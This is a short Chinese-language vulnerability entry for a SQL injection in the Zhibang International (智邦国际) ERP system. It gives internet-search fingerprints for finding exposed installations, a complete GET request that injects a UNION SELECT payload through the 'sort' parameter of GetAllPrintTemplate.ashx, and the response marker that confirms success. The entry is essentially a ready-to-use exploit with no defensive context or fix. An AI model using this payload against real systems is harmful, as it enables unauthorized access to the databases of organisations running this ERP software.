# 智邦国际-GetAllPrintTemplate-SQL注入漏洞

智邦国际 ｜ SQL注入 ｜ —
- **指纹**：`hunter:app.name="智邦国际 ERP" fofa:body="/SYSN/"`
- **请求**：`GET /SYSN/json/pcclient/GetAllPrintTemplate.ashx?sort=12+UNION+ALL+SELECT+NULL,NULL,char(115)%2Bchar(99)%2Bchar(97)%2Bchar(109)%2Bchar(97)%2Bchar(103)%2Bchar(105)%2Bchar(99),NULL-- HTTP/1.1`
- **响应特征**：200 scamagic